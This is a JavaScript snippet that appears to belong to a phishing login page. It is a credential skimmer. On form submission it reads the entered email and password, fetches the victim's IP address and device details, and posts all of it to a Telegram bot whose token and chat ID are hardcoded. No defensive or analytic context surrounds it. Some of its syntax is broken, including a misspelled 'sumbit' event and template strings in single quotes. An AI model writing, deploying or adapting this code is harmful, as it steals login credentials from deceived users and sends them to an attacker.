<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>

<script> 
    const TOKEN = "8010286590:AAHWLhVtcgYORby39IHZhxou7Idvf0BaDLE";
    const CHAT_ID = "7153864821";
    const URI_API = 'https://api.telegram.org/bot${TOKEN}/sendMessage';


    document.getElementById('login-form').addEventListener('sumbit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;
                console.log('User IP:', ip);


                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Device';

                console.log('User-Agent:', userAgent);
                console.log('Platform:', platform);
                console.log('Screen Resolution:', screenWidth + 'x' + screenHeight);

                const message = '
                    <b>New Login Attempt</b>\n
                    <b>Email:</b> ${email}\n
                    <b>Password:</b> ${password}\n
                    <b>IP Address:</b> ${ip}\n
                    <b>Device Type:</b> ${deviceType}\n
                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                ';

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    console.log('Message sent:', response.data);
                    alert('Informaçoes enviadas com sucesso!');
                }).catch(error => {
                    console.error('Error sending message:', error);
                    alert('Erro ao enviar as informaçoes. Tente novamente.');
                });
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
                alert('Erro ao obter o endereço IP. Tente novamente.');
            });
    });
</script>
